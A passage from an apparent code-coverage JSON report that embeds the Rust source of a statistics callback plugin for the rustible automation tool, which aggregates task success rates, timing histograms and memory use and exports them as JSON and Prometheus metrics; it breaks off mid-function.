":2}},{"line":691,"address":[31037252],"length":1,"stats":{"Line":1}},{"line":695,"address":[31041283,31041264],"length":1,"stats":{"Line":0}},{"line":699,"address":[31037760,31037779],"length":1,"stats":{"Line":0}}],"covered":153,"coverable":243},{"path":["/","home","artur","Repositories","rustible","src","callback","plugins","stats.rs"],"content":"//! Statistics Aggregator callback plugin for Rustible.\n//!\n//! This plugin collects comprehensive execution statistics including:\n//! - Task success/failure rates per host and overall\n//! - Timing metrics per module type\n//! - Memory/resource usage tracking\n//! - Export capabilities in multiple formats (JSON, Prometheus)\n//!\n//! # Features\n//!\n//! - **Comprehensive Metrics**: Track all task results with detailed timing\n//! - **Module Classification**: Group stats by module type (LocalLogic, NativeTransport, etc.)\n//! - **Export Formats**: JSON for analysis, Prometheus for monitoring integration\n//! - **Thread-safe**: Safe for concurrent access across parallel task execution\n//! - **Histogram Support**: Distribution of execution times for percentile analysis\n//!\n//! # Example Output (JSON)\n//!\n//! ```json\n//! {\n//!   \"playbook\": \"deploy.yml\",\n//!   \"duration_secs\": 45.23,\n//!   \"hosts\": {\n//!     \"webserver1\": {\n//!       \"ok\": 15, \"changed\": 5, \"failed\": 0, \"skipped\": 2\n//!     }\n//!   },\n//!   \"module_stats\": {\n//!     \"apt\": { \"count\": 10, \"avg_duration_ms\": 1250.5, \"failures\": 0 }\n//!   }\n//! }\n//! ```\n//!\n//! # Prometheus Format\n//!\n//! ```text\n//! # HELP rustible_tasks_total Total number of tasks executed\n//! # TYPE rustible_tasks_total counter\n//! rustible_tasks_total{status=\"ok\"} 50\n//! rustible_tasks_total{status=\"changed\"} 20\n//! rustible_tasks_total{status=\"failed\"} 2\n//! ```\n//!\n//! # Example Usage\n//!\n//! ```rust,ignore\n//! use rustible::callback::plugins::stats::{StatsCallback, StatsConfig};\n//!\n//! // Create with default config\n//! let callback = StatsCallback::new();\n//!\n//! // Or with custom config\n//! let config = StatsConfig {\n//!     enable_histograms: true,\n//!     per_host_module_stats: true,\n//!     track_memory: true,\n//!     ..Default::default()\n//! };\n//! let callback = StatsCallback::with_config(config);\n//!\n//! // After execution, export stats\n//! let json = callback.export_json();\n//! let prometheus = callback.export_prometheus();\n//! ```\n\nuse std::collections::HashMap;\nuse std::sync::atomic::{AtomicU64, Ordering};\nuse std::sync::Arc;\nuse std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};\n\nuse async_trait::async_trait;\nuse parking_lot::RwLock;\nuse serde::{Deserialize, Serialize};\n\nuse crate::facts::Facts;\nuse crate::traits::{ExecutionCallback, ExecutionResult, ModuleResult};\n\n/// Configuration options for the stats callback.\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct StatsConfig {\n    /// Whether to track timing histograms (slightly more overhead)\n    pub enable_histograms: bool,\n    /// Whether to track per-host module breakdowns\n    pub per_host_module_stats: bool,\n    /// Whether to track memory usage (requires platform support)\n    pub track_memory: bool,\n    /// Histogram bucket boundaries in milliseconds\n    pub histogram_buckets_ms: Vec\u003cu64\u003e,\n}\n\nimpl Default for StatsConfig {\n    fn default() -\u003e Self {\n        Self {\n            enable_histograms: true,\n            per_host_module_stats: false,\n            track_memory: false,\n            // Default Prometheus-style buckets: 10ms, 50ms, 100ms, 250ms, 500ms, 1s, 2.5s, 5s, 10s\n            histogram_buckets_ms: vec![10, 50, 100, 250, 500, 1000, 2500, 5000, 10000],\n        }\n    }\n}\n\n/// Module classification tiers for grouping statistics.\n#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]\n#[serde(rename_all = \"snake_case\")]\npub enum ModuleClassification {\n    /// Tier 1: Logic modules that run on the control node\n    LocalLogic,\n    /// Tier 2: File/transport modules with native Rust implementation\n    NativeTransport,\n    /// Tier 3: Remote command execution modules\n    RemoteCommand,\n    /// Tier 4: Python fallback for Ansible compatibility\n    PythonFallback,\n}\n\nimpl std::fmt::Display for ModuleClassification {\n    fn fmt(\u0026self, f: \u0026mut std::fmt::Formatter\u003c'_\u003e) -\u003e std::fmt::Result {\n        match self {\n            ModuleClassification::LocalLogic =\u003e write!(f, \"local_logic\"),\n            ModuleClassification::NativeTransport =\u003e write!(f, \"native_transport\"),\n            ModuleClassification::RemoteCommand =\u003e write!(f, \"remote_command\"),\n            ModuleClassification::PythonFallback =\u003e write!(f, \"python_fallback\"),\n        }\n    }\n}\n\n/// Per-host execution statistics.\n#[derive(Debug, Clone, Default, Serialize, Deserialize)]\npub struct HostStats {\n    /// Number of tasks that completed successfully without changes\n    pub ok: u64,\n    /// Number of tasks that made changes\n    pub changed: u64,\n    /// Number of tasks that failed\n    pub failed: u64,\n    /// Number of tasks that were skipped\n    pub skipped: u64,\n    /// Number of unreachable attempts\n    pub unreachable: u64,\n    /// Total execution time in milliseconds for this host\n    pub total_duration_ms: u64,\n}\n\nimpl HostStats {\n    /// Create new empty host stats.\n    pub fn new() -\u003e Self {\n        Self::default()\n    }\n\n    /// Record a task result.\n    pub fn record(\u0026mut self, result: \u0026ModuleResult, duration: Duration) {\n        let duration_ms = duration.as_millis() as u64;\n        self.total_duration_ms += duration_ms;\n\n        if result.skipped {\n            self.skipped += 1;\n        } else if !result.success {\n            self.failed += 1;\n        } else if result.changed {\n            self.changed += 1;\n        } else {\n            self.ok += 1;\n        }\n    }\n\n    /// Get total task count.\n    pub fn total(\u0026self) -\u003e u64 {\n        self.ok + self.changed + self.failed + self.skipped + self.unreachable\n    }\n\n    /// Calculate success rate as a percentage.\n    pub fn success_rate(\u0026self) -\u003e f64 {\n        let total = self.total();\n        if total == 0 {\n            100.0\n        } else {\n            let successful = self.ok + self.changed + self.skipped;\n            (successful as f64 / total as f64) * 100.0\n        }\n    }\n}\n\n/// Statistics for a specific module type.\n#[derive(Debug, Clone, Default, Serialize, Deserialize)]\npub struct ModuleStats {\n    /// Total number of executions\n    pub count: u64,\n    /// Number of successful executions (ok + changed)\n    pub successes: u64,\n    /// Number of failures\n    pub failures: u64,\n    /// Number of tasks that made changes\n    pub changed: u64,\n    /// Number of skipped tasks\n    pub skipped: u64,\n    /// Total execution time in milliseconds\n    pub total_duration_ms: u64,\n    /// Minimum execution time in milliseconds\n    pub min_duration_ms: Option\u003cu64\u003e,\n    /// Maximum execution time in milliseconds\n    pub max_duration_ms: Option\u003cu64\u003e,\n    /// Module classification tier\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub classification: Option\u003cModuleClassification\u003e,\n}\n\nimpl ModuleStats {\n    /// Create new empty module stats.\n    pub fn new() -\u003e Self {\n        Self::default()\n    }\n\n    /// Create module stats with a classification.\n    pub fn with_classification(classification: ModuleClassification) -\u003e Self {\n        Self {\n            classification: Some(classification),\n            ..Default::default()\n        }\n    }\n\n    /// Record a task execution result.\n    pub fn record(\u0026mut self, result: \u0026ModuleResult, duration_ms: u64) {\n        self.count += 1;\n\n        if result.skipped {\n            self.skipped += 1;\n        } else if !result.success {\n            self.failures += 1;\n        } else {\n            self.successes += 1;\n            if result.changed {\n                self.changed += 1;\n            }\n        }\n\n        self.total_duration_ms += duration_ms;\n        self.min_duration_ms = Some(\n            self.min_duration_ms\n                .map(|m| m.min(duration_ms))\n                .unwrap_or(duration_ms),\n        );\n        self.max_duration_ms = Some(\n            self.max_duration_ms\n                .map(|m| m.max(duration_ms))\n                .unwrap_or(duration_ms),\n        );\n    }\n\n    /// Calculate average duration in milliseconds.\n    pub fn avg_duration_ms(\u0026self) -\u003e f64 {\n        if self.count == 0 {\n            0.0\n        } else {\n            self.total_duration_ms as f64 / self.count as f64\n        }\n    }\n\n    /// Calculate success rate as a percentage.\n    pub fn success_rate(\u0026self) -\u003e f64 {\n        if self.count == 0 {\n            100.0\n        } else {\n            (self.successes as f64 / self.count as f64) * 100.0\n        }\n    }\n\n    /// Calculate change rate as a percentage of successful executions.\n    pub fn change_rate(\u0026self) -\u003e f64 {\n        if self.successes == 0 {\n            0.0\n        } else {\n            (self.changed as f64 / self.successes as f64) * 100.0\n        }\n    }\n}\n\n/// Histogram for tracking duration distributions.\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct DurationHistogram {\n    /// Bucket boundaries in milliseconds\n    pub buckets: Vec\u003cu64\u003e,\n    /// Count per bucket (bucket[i] = count of durations \u003c= buckets[i])\n    pub counts: Vec\u003cu64\u003e,\n    /// Count of values above the highest bucket\n    pub overflow: u64,\n    /// Sum of all values for calculating mean\n    pub sum_ms: u64,\n    /// Total count\n    pub total: u64,\n}\n\nimpl DurationHistogram {\n    /// Create a new histogram with the given bucket boundaries.\n    pub fn new(buckets: Vec\u003cu64\u003e) -\u003e Self {\n        let counts = vec![0; buckets.len()];\n        Self {\n            buckets,\n            counts,\n            overflow: 0,\n            sum_ms: 0,\n            total: 0,\n        }\n    }\n\n    /// Record a duration value.\n    pub fn record(\u0026mut self, duration_ms: u64) {\n        self.sum_ms += duration_ms;\n        self.total += 1;\n\n        // Find the appropriate bucket\n        for (i, \u0026boundary) in self.buckets.iter().enumerate() {\n            if duration_ms \u003c= boundary {\n                self.counts[i] += 1;\n                return;\n            }\n        }\n        // Value exceeds all buckets\n        self.overflow += 1;\n    }\n\n    /// Calculate the approximate percentile value.\n    pub fn percentile(\u0026self, p: f64) -\u003e Option\u003cu64\u003e {\n        if self.total == 0 {\n            return None;\n        }\n\n        let target = (self.total as f64 * p / 100.0).ceil() as u64;\n        let mut cumulative = 0u64;\n\n        for (i, \u0026count) in self.counts.iter().enumerate() {\n            cumulative += count;\n            if cumulative \u003e= target {\n                return Some(self.buckets[i]);\n            }\n        }\n\n        // Return highest bucket if we're in overflow\n        self.buckets.last().copied()\n    }\n\n    /// Calculate mean duration.\n    pub fn mean(\u0026self) -\u003e f64 {\n        if self.total == 0 {\n            0.0\n        } else {\n            self.sum_ms as f64 / self.total as f64\n        }\n    }\n}\n\n/// Memory usage snapshot.\n#[derive(Debug, Clone, Default, Serialize, Deserialize)]\npub struct MemorySnapshot {\n    /// Timestamp in milliseconds since epoch\n    pub timestamp_ms: u64,\n    /// Resident set size in bytes (if available)\n    pub rss_bytes: Option\u003cu64\u003e,\n    /// Virtual memory size in bytes (if available)\n    pub vms_bytes: Option\u003cu64\u003e,\n    /// Heap allocated bytes (if available)\n    pub heap_bytes: Option\u003cu64\u003e,\n}\n\nimpl MemorySnapshot {\n    /// Take a memory snapshot (platform-dependent).\n    #[cfg(target_os = \"linux\")]\n    pub fn take() -\u003e Self {\n        let timestamp_ms = SystemTime::now()\n            .duration_since(UNIX_EPOCH)\n            .map(|d| d.as_millis() as u64)\n            .unwrap_or(0);\n\n        // Try to read /proc/self/statm for memory info\n        let (rss_bytes, vms_bytes) = std::fs::read_to_string(\"/proc/self/statm\")\n            .ok()\n            .and_then(|content| {\n                let parts: Vec\u003c\u0026str\u003e = content.split_whitespace().collect();\n                if parts.len() \u003e= 2 {\n                    let page_size = 4096u64; // Typical page size\n                    let vms = parts[0].parse::\u003cu64\u003e().ok().map(|v| v * page_size);\n                    let rss = parts[1].parse::\u003cu64\u003e().ok().map(|v| v * page_size);\n                    Some((rss, vms))\n                } else {\n                    None\n                }\n            })\n            .unwrap_or((None, None));\n\n        Self {\n            timestamp_ms,\n            rss_bytes,\n            vms_bytes,\n            heap_bytes: None,\n        }\n    }\n\n    /// Take a memory snapshot (non-Linux platforms).\n    #[cfg(not(target_os = \"linux\"))]\n    pub fn take() -\u003e Self {\n        let timestamp_ms = SystemTime::now()\n            .duration_since(UNIX_EPOCH)\n            .map(|d| d.as_millis() as u64)\n            .unwrap_or(0);\n\n        Self {\n            timestamp_ms,\n            rss_bytes: None,\n            vms_bytes: None,\n            heap_bytes: None,\n        }\n    }\n}\n\n/// Statistics for a single play within a playbook.\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct PlayStats {\n    /// Play name\n    pub name: String,\n    /// Target hosts\n    pub hosts: Vec\u003cString\u003e,\n    /// Duration in milliseconds\n    pub duration_ms: Option\u003cu64\u003e,\n    /// Task count\n    pub task_count: u64,\n    /// Start timestamp\n    pub start_time_ms: u64,\n    /// Whether the play succeeded\n    pub success: bool,\n}\n\n/// Aggregated statistics for an entire playbook execution.\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct PlaybookStats {\n    /// Playbook file name\n    pub playbook: String,\n    /// Start timestamp in milliseconds since epoch\n    pub start_time_ms: u64,\n    /// End timestamp in milliseconds since epoch (if completed)\n    pub end_time_ms: Option\u003cu64\u003e,\n    /// Total duration in seconds\n    pub duration_secs: Option\u003cf64\u003e,\n    /// Per-host statistics\n    pub hosts: HashMap\u003cString, HostStats\u003e,\n    /// Per-module statistics\n    pub module_stats: HashMap\u003cString, ModuleStats\u003e,\n    /// Statistics grouped by module classification\n    pub classification_stats: HashMap\u003cString, ModuleStats\u003e,\n    /// Overall task counts\n    pub total_tasks: u64,\n    pub total_ok: u64,\n    pub total_changed: u64,\n    pub total_failed: u64,\n    pub total_skipped: u64,\n    pub total_unreachable: u64,\n    /// Duration histogram (if enabled)\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub duration_histogram: Option\u003cDurationHistogram\u003e,\n    /// Memory snapshots (if enabled)\n    #[serde(skip_serializing_if = \"Vec::is_empty\")]\n    pub memory_snapshots: Vec\u003cMemorySnapshot\u003e,\n    /// Current play name\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub current_play: Option\u003cString\u003e,\n    /// Play statistics\n    pub plays: Vec\u003cPlayStats\u003e,\n    /// Whether the playbook succeeded\n    pub success: bool,\n}\n\nimpl PlaybookStats {\n    /// Create new stats for a playbook.\n    pub fn new(playbook: \u0026str, config: \u0026StatsConfig) -\u003e Self {\n        let histogram = if config.enable_histograms {\n            Some(DurationHistogram::new(config.histogram_buckets_ms.clone()))\n        } else {\n            None\n        };\n\n        Self {\n            playbook: playbook.to_string(),\n            start_time_ms: SystemTime::now()\n                .duration_since(UNIX_EPOCH)\n                .map(|d| d.as_millis() as u64)\n                .unwrap_or(0),\n            end_time_ms: None,\n            duration_secs: None,\n            hosts: HashMap::new(),\n            module_stats: HashMap::new(),\n            classification_stats: HashMap::new(),\n            total_tasks: 0,\n            total_ok: 0,\n            total_changed: 0,\n            total_failed: 0,\n            total_skipped: 0,\n            total_unreachable: 0,\n            duration_histogram: histogram,\n            memory_snapshots: Vec::new(),\n            current_play: None,\n            plays: Vec::new(),\n            success: true,\n        }\n    }\n\n    /// Calculate overall success rate.\n    pub fn success_rate(\u0026self) -\u003e f64 {\n        if self.total_tasks == 0 {\n            100.0\n        } else {\n            let successful = self.total_ok + self.total_changed + self.total_skipped;\n            (successful as f64 / self.total_tasks as f64) * 100.0\n        }\n    }\n\n    /// Check if any failures occurred.\n    pub fn has_failures(\u0026self) -\u003e bool {\n        self.total_failed \u003e 0 || self.total_unreachable \u003e 0\n    }\n}\n\n/// Thread-safe internal state for the stats callback.\nstruct StatsState {\n    /// Configuration\n    config: StatsConfig,\n    /// Current playbook stats (if a playbook is running)\n    current_stats: Option\u003cPlaybookStats\u003e,\n    /// Historical stats from previous playbook runs in this session\n    history: Vec\u003cPlaybookStats\u003e,\n    /// Current task start time (for timing)\n    task_start: Option\u003cInstant\u003e,\n    /// Current play start time\n    play_start: Option\u003cInstant\u003e,\n    /// Playbook start time\n    playbook_start: Option\u003cInstant\u003e,\n    /// Module to classification mapping cache\n    module_classifications: HashMap\u003cString, ModuleClassification\u003e,\n}\n\nimpl StatsState {\n    fn new(config: StatsConfig) -\u003e Self {\n        Self {\n            config,\n            current_stats: None,\n            history: Vec::new(),\n            task_start: None,\n            play_start: None,\n            playbook_start: None,\n            module_classifications: Self::build_classification_map(),\n        }\n    }\n\n    /// Build the default module classification map.\n    fn build_classification_map() -\u003e HashMap\u003cString, ModuleClassification\u003e {\n        let mut map = HashMap::new();\n\n        // LocalLogic modules (Tier 1)\n        for module in \u0026[\n            \"debug\",\n            \"set_fact\",\n            \"assert\",\n            \"fail\",\n            \"meta\",\n            \"include_tasks\",\n            \"import_tasks\",\n            \"include_vars\",\n            \"pause\",\n            \"wait_for\",\n        ] {\n            map.insert(module.to_string(), ModuleClassification::LocalLogic);\n        }\n\n        // NativeTransport modules (Tier 2)\n        for module in \u0026[\n            \"copy\",\n            \"template\",\n            \"file\",\n            \"lineinfile\",\n            \"blockinfile\",\n            \"fetch\",\n            \"stat\",\n            \"synchronize\",\n        ] {\n            map.insert(module.to_string(), ModuleClassification::NativeTransport);\n        }\n\n        // RemoteCommand modules (Tier 3)\n        for module in \u0026[\n            \"command\", \"shell\", \"raw\", \"script\", \"service\", \"systemd\", \"apt\", \"yum\", \"dnf\",\n            \"package\", \"pip\", \"user\", \"group\", \"git\", \"cron\",\n        ] {\n            map.insert(module.to_string(), ModuleClassification::RemoteCommand);\n        }\n\n        map\n    }\n\n    /// Get classification for a module.\n    fn get_classification(\u0026self, module: \u0026str) -\u003e ModuleClassification {\n        self.module_classifications\n            .get(module)\n            .copied()\n            .unwrap_or(ModuleClassification::PythonFallback)\n    }\n}\n\n/// Statistics Aggregator callback plugin.\n///\n/// Collects comprehensive execution statistics and exports them in\n/// multiple formats for analysis and monitoring integration.\n///\n/// # Thread Safety\n///\n/// This callback is thread-safe and can be safely shared across\n/// parallel task executions. All state mutations are protected\n/// by a RwLock.\npub struct StatsCallback {\n    state: Arc\u003cRwLock\u003cStatsState\u003e\u003e,\n    /// Atomic counters for lock-free hot path updates\n    task_counter: AtomicU64,\n}\n\nimpl StatsCallback {\n    /// Create a new stats callback with default configuration.\n    pub fn new() -\u003e Self {\n        Self::with_config(StatsConfig::default())\n    }\n\n    /// Create a stats callback with custom configuration.\n    pub fn with_config(config: StatsConfig) -\u003e Self {\n        Self {\n            state: Arc::new(RwLock::new(StatsState::new(config))),\n            task_counter: AtomicU64::new(0),\n        }\n    }\n\n    /// Get the current playbook statistics (if running).\n    pub fn current_stats(\u0026self) -\u003e Option\u003cPlaybookStats\u003e {\n        self.state.read().current_stats.clone()\n    }\n\n    /// Get historical statistics from previous runs.\n    pub fn history(\u0026self) -\u003e Vec\u003cPlaybookStats\u003e {\n        self.state.read().history.clone()\n    }\n\n    /// Export current statistics as JSON.\n    pub fn export_json(\u0026self) -\u003e String {\n        let state = self.state.read();\n        if let Some(ref stats) = state.current_stats {\n            serde_json::to_string_pretty(stats).unwrap_or_else(|_| \"{}\".to_string())\n        } else if let Some(last) = state.history.last() {\n            serde_json::to_string_pretty(last).unwrap_or_else(|_| \"{}\".to_string())\n        } else {\n            \"{}\".to_string()\n        }\n    }\n\n    /// Export current statistics as compact JSON (single line).\n    pub fn export_json_compact(\u0026self) -\u003e String {\n        let state = self.state.read();\n        if let Some(ref stats) = state.current_stats {\n            serde_json::to_string(stats).unwrap_or_else(|_| \"{}\".to_string())\n        } else if let Some(last) = state.history.last() {\n            serde_json::to_string(last).unwrap_or_else(|_| \"{}\".to_string())\n        } else {\n            \"{}\".to_string()\n        }\n    }\n\n    /// Export current statistics in Prometheus exposition format.\n    pub fn export_prometheus(\u0026self) -\u003e String {\n        let state = self.state.read();\n        let stats = state\n            .current_stats\n            .as_ref()\n            .or_else(|| state.history.last());\n\n        let Some(stats) = stats else {\n            return String::new();\n        };\n\n        let mut output = String::new();\n\n        // Task totals\n        output.push_str(\"# HELP rustible_tasks_total Total number of tasks executed\\n\");\n        output.push_str(\"# TYPE rustible_tasks_total counter\\n\");\n        output.push_str(\u0026format!(\n            \"rustible_tasks_total{{status=\\\"ok\\\"}} {}\\n\",\n            stats.total_ok\n        ));\n        output.push_str(\u0026format!(\n            \"rustible_tasks_total{{status=\\\"changed\\\"}} {}\\n\",\n            stats.total_changed\n        ));\n        output.push_str(\u0026format!(\n            \"rustible_tasks_total{{status=\\\"failed\\\"}} {}\\n\",\n            stats.total_failed\n        ));\n        output.push_str(\u0026format!(\n            \"rustible_tasks_total{{status=\\\"skipped\\\"}} {}\\n\",\n            stats.total_skipped\n        ));\n        output.push_str(\u0026format!(\n            \"rustible_tasks_total{{status=\\\"unreachable\\\"}} {}\\n\",\n            stats.total_unreachable\n        ));\n\n        // Duration\n        if let Some(duration) = stats.duration_secs {\n            output.push_str(\n                \"\\n# HELP rustible_playbook_duration_seconds Total playbook execution time\\n\",\n            );\n            output.push_str(\"# TYPE rustible_playbook_duration_seconds gauge\\n\");\n            output.push_str(\u0026format!(\n                \"rustible_playbook_duration_seconds{{playbook=\\\"{}\\\"}} {:.3}\\n\",\n                stats.playbook, duration\n            ));\n        }\n\n        // Success rate\n        output.push_str(\"\\n# HELP rustible_success_rate Percentage of successful tasks\\n\");\n        output.push_str(\"# TYPE rustible_success_rate gauge\\n\");\n        output.push_str(\u0026format!(\n            \"rustible_success_rate{{playbook=\\\"{}\\\"}} {:.2}\\n\",\n            stats.playbook,\n            stats.success_rate()\n        ));\n\n        // Per-host stats\n        output.push_str(\"\\n# HELP rustible_host_tasks_total Tasks per host by status\\n\");\n        output.push_str(\"# TYPE rustible_host_tasks_total counter\\n\");\n        for (host, host_stats) in \u0026stats.hosts {\n            output.push_str(\u0026format!(\n                \"rustible_host_tasks_total{{host=\\\"{}\\\",status=\\\"ok\\\"}} {}\\n\",\n                host, host_stats.ok\n            ));\n            output.push_str(\u0026format!(\n                \"rustible_host_tasks_total{{host=\\\"{}\\\",status=\\\"changed\\\"}} {}\\n\",\n                host, host_stats.changed\n            ));\n            output.push_str(\u0026format!(\n                \"rustible_host_tasks_total{{host=\\\"{}\\\",status=\\\"failed\\\"}} {}\\n\",\n                host, host_stats.failed\n            ));\n            output.push_str(\u0026format!(\n                \"rustible_host_tasks_total{{host=\\\"{}\\\",status=\\\"skipped\\\"}} {}\\n\",\n                host, host_stats.skipped\n            ));\n        }\n\n        // Per-module stats\n        output.push_str(\n            \"\\n# HELP rustible_module_duration_seconds_total Total execution time per module\\n\",\n        );\n        output.push_str(\"# TYPE rustible_module_duration_seconds_total counter\\n\");\n        output.push_str(\"\\n# HELP rustible_module_executions_total Executions per module\\n\");\n        output.push_str(\"# TYPE rustible_module_executions_total counter\\n\");\n        for (module, module_stats) in \u0026stats.module_stats {\n            output.push_str(\u0026format!(\n                \"rustible_module_executions_total{{module=\\\"{}\\\"}} {}\\n\",\n                module, module_stats.count\n            ));\n            output.push_str(\u0026format!(\n                \"rustible_module_duration_seconds_total{{module=\\\"{}\\\"}} {:.3}\\n\",\n                module,\n                module_stats.total_duration_ms as f64 / 1000.0\n            ));\n            output.push_str(\u0026format!(\n                \"rustible_module_failures_total{{module=\\\"{}\\\"}} {}\\n\",\n                module, module_stats.failures\n            ));\n        }\n\n        // Classification stats\n        output.push_str(\n            \"\\n# HELP rustible_classification_duration_seconds_total Time by module classification\\n\",\n        );\n        output.push_str(\"# TYPE rustible_classification_duration_seconds_total counter\\n\");\n        for (classification, class_stats) in \u0026stats.classification_stats {\n            output.push_str(\u0026format!(\n                \"rustible_classification_executions_total{{classification=\\\"{}\\\"}} {}\\n\",\n                classification, class_stats.count\n            ));\n            output.push_str(\u0026format!(\n                \"rustible_classification_duration_seconds_total{{classification=\\\"{}\\\"}} {:.3}\\n\",\n                classification,\n                class_stats.total_duration_ms as f64 / 1000.0\n            ));\n        }\n\n        // Histogram buckets if available\n        if let Some(ref histogram) = stats.duration_histogram {\n            output.push_str(\n                \"\\n# HELP rustible_task_duration_seconds Task execution duration histogram\\n\",\n            );\n            output.push_str(\"# TYPE rustible_task_duration_seconds histogram\\n\");\n\n            let mut cumulative = 0u64;\n            for (i, \u0026bucket) in histogram.buckets.iter().enumerate() {\n                cumulative += histogram.counts[i];\n                output.push_str(\u0026format!(\n                    \"rustible_task_duration_seconds_bucket{{le=\\\"{:.3}\\\"}} {}\\n\",\n                    bucket as f64 / 1000.0,\n                    cumulative\n                ));\n            }\n            output.push_str(\u0026format!(\n                \"rustible_task_duration_seconds_bucket{{le=\\\"+Inf\\\"}} {}\\n\",\n                histogram.total\n            ));\n            output.push_str(\u0026format!(\n                \"rustible_task_duration_seconds_sum {:.3}\\n\",\n                histogram.sum_ms as f64 / 1000.0\n            ));\n            output.push_str(\u0026format!(\n                \"rustible_task_duration_seconds_count {}\\n\",\n                histogram.total\n            ));\n        }\n\n        // Memory stats if available\n        if let Some(snapshot) = stats.memory_snapshots.last() {\n            if let Some(rss) = snapshot.rss_bytes {\n                output.push_str(\"\\n# HELP rustible_memory_rss_bytes Resident set size in bytes\\n\");\n                output.push_str(\"# TYPE rustible_memory_rss_bytes gauge\\n\");\n                output.push_str(\u0026format!(\"rustible_memory_rss_bytes {}\\n\", rss));\n            }\n            if let Some(vms) = snapshot.vms_bytes {\n                output\n                    .push_str(\"\\n# HELP rustible_memory_vms_bytes Virtual memory size in bytes\\n\");\n                output.push_str(\"# TYPE rustible_memory_vms_bytes gauge\\n\");\n                output.push_str(\u0026format!(\"rustible_memory_vms_bytes {}\\n\", vms));\n            }\n        }\n\n        output\n    }\n\n    /// Get a summary string suitable for logging.\n    pub fn summary(\u0026self) -\u003e String {\n        let state = self.state.read();\n        let stats = state\n            .current_stats\n            .as_ref()\n            .or_else(|| state.history.last());\n\n        let Some(stats) = stats else {\n            return \"No statistics available\".to_string();\n        };\n\n        let mut summary = String::new();\n        summary.push_str(\u0026format!(\"Playbook: {}\\n\", stats.playbook));\n\n        if let Some(duration) = stats.duration_secs {\n            summary.push_str(\u0026format!(\"Duration: {:.2}s\\n\", duration));\n        }\n\n        summary.push_str(\u0026format!(\n            \"Tasks: {} total, {} ok, {} changed, {} failed, {} skipped\\n\",\n            stats.total_tasks,\n            stats.total_ok,\n            stats.total_changed,\n            stats.total_failed,\n            stats.total_skipped\n        ));\n\n        summary.push_str(\u0026format!(\"Success Rate: {:.1}%\\n\", stats.success_rate()));\n\n        if !stats.module_stats.is_empty() {\n            summary.push_str(\"\\nTop modules by execution time:\\n\");\n            let mut modules: Vec\u003c_\u003e = stats.module_stats.iter().collect();\n            modules.sort_by(|a, b| b.1.total_duration_ms.cmp(\u0026a.1.total_duration_ms));\n\n            for (module, module_stats) in modules.iter().take(5) {\n                summary.push_str(\u0026format!(\n                    \"  {}: {} calls, {:.1}ms avg, {:.1}% success\\n\",\n                    module,\n                    module_stats.count,\n                    module_stats.avg_duration_ms(),\n                    module_stats.success_rate()\n                ));\n            }\n        }\n\n        summary\n    }\n\n    /// Reset all statistics.\n    pub fn reset(\u0026self) {\n        let mut state = self.state.write();\n        state.current_stats = None;\n        state.task_start = None;\n        state.play_start = None;\n        state.playbook_start = None;\n        self.task_counter.store(0, Ordering::SeqCst);\n    }\n\n    /// Clear history but keep current stats.\n    pub fn clear_history(\u0026self) {\n        let mut state = self.state.write();\n        state.history.clear();\n    }\n\n    /// Take a memory snapshot if tracking is enabled.\n    fn maybe_snapshot_memory(\u0026self) {\n        let mut state = self.state.write();\n        if state.config.track_memory {\n            if let Some(ref mut stats) = state.current_stats {\n                stats.memory_snapshots.push(MemorySnapshot::take());\n            }\n        }\n    }\n\n    /// Record module execution with explicit module name.\n    pub fn record_module_execution(\u0026self, module: \u0026str, result: \u0026ModuleResult, duration: Duration) {\n        let duration_ms = duration.as_millis() as u64;\n        let mut state = self.state.write();\n\n        let classification = state.get_classification(module);\n\n        let Some(ref mut stats) = state.current_stats else {\n            return;\n        };\n\n        // Update per-module stats\n        let module_stats = stats\n            .module_stats\n            .entry(module.to_string())\n            .or_insert_with(|| ModuleStats::with_classification(classification));\n        module_stats.record(result, duration_ms);\n\n        // Update classification stats\n        let class_stats = stats\n            .classification_stats\n            .entry(classification.to_string())\n            .or_default();\n        class_stats.record(result, duration_ms);\n    }\n}\n\nimpl Default for StatsCallback {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\nimpl Clone for StatsCallback {\n    fn clone(\u0026self) -\u003e Self {\n        Self {\n            state: Arc::clone(\u0026self.state),\n            task_counter: AtomicU64::new(self.task_counter.load(Ordering::SeqCst)),\n        }\n    }\n}\n\nimpl std::fmt::Debug for StatsCallback {\n    fn fmt(\u0026self, f: \u0026mut std::fmt::Formatter\u003c'_\u003e) -\u003e std::fmt::Result {\n        f.debug_struct(\"StatsCallback\")\n            .field(\"task_counter\", \u0026self.task_counter.load(Ordering::SeqCst))\n            .finish()\n    }\n}\n\n#[async_trait]\nimpl ExecutionCallback for StatsCallback {\n    async fn on_playbook_start(\u0026self, name: \u0026str) {\n        let mut state = self.state.write();\n\n        // Archive any existing stats\n        if let Some(old_stats) = state.current_stats.take() {\n            state.history.push(old_stats);\n        }\n\n        // Start new stats\n        state.current_stats = Some(PlaybookStats::new(name, \u0026state.config));\n        state.task_start = None;\n        state.play_start = None;\n        state.playbook_start = Some(Instant::now());\n\n        self.task_counter.store(0, Ordering::SeqCst);\n\n        // Initial memory snapshot\n        drop(state);\n        self.maybe_snapshot_memory();\n    }\n\n    async fn on_playbook_end(\u0026self, _name: \u0026str, success: bool) {\n        let mut state = self.state.write();\n\n        // Get duration before borrowing current_stats mutably\n        let duration_secs = state\n            .playbook_start\n            .map(|start| start.elapsed().as_secs_f64());\n\n        if let Some(ref mut playbook_stats) = state.current_stats {\n            playbook_stats.end_time_ms = Some(\n                SystemTime::now()\n                    .duration_since(UNIX_EPOCH)\n                    .map(|d| d.as_millis() as u64)\n                    .unwrap_or(0),\n            );\n\n            if let Some(secs) = duration_secs {\n                playbook_stats.duration_secs = Some(secs);\n            }\n\n            playbook_stats.success = success;\n        }\n\n        // Final memory snapshot\n        drop(state);\n        self.maybe_snapshot_memory();\n    }\n\n    async fn on_play_start(\u0026self, name: \u0026str, hosts: \u0026[String]) {\n        let mut state = self.state.write();\n\n        state.play_start = Some(Instant::now());\n\n        if let Some(ref mut stats) = state.current_stats {\n            stats.current_play = Some(name.to_string());\n            stats.plays.push(PlayStats {\n                name: name.to_string(),\n                hosts: 